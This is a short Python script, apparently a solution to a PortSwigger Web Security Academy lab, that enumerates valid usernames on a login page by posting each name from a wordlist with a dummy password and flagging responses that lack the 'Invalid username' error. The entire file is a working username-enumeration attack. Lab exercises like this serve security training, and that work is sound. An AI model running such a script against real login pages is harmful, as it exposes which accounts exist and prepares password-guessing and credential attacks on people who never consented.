import requests

url = "https://0add009103b6c6e280ceefdf00d400e7.web-security-academy.net/login"

cookies = {
	"session": "YOUR_SESSION"
}

headers = {
	"Origin": "https://0add009103b6c6e280ceefdf00d400e7.web-security-academy.net",
	"Referer": "https://0add009103b6c6e280ceefdf00d400e7.web-security-academy.net/login"
}


with open("usernames", "r") as file:
	usernames = file.read().splitlines()

for user in usernames:
	data = {
		"username": user,
		"password": "pass"
	}

	response = requests.post(url, cookies=cookies, headers=headers, data=data)

	if 'Invalid username' in response.text:
		continue
	else:
		print(f'Valid Username: {user}')
